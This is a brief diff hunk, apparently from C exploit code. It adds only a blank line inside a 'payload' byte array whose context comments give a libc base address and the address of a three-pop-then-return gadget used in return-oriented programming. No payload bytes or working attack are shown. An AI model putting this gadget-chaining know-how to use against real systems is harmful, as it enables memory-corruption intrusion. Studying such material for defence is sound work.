@@ -53,6 +53,7 @@ unsigned char payload[] =
 	// 0xb5e710f0 is start address of libc text segment
 	// 16d4ee into libc we have 3 pops, followed by ret
 	// 0xb5fc54ee is the address of 3 pops, followed by ret
+	
 ;
 
 int
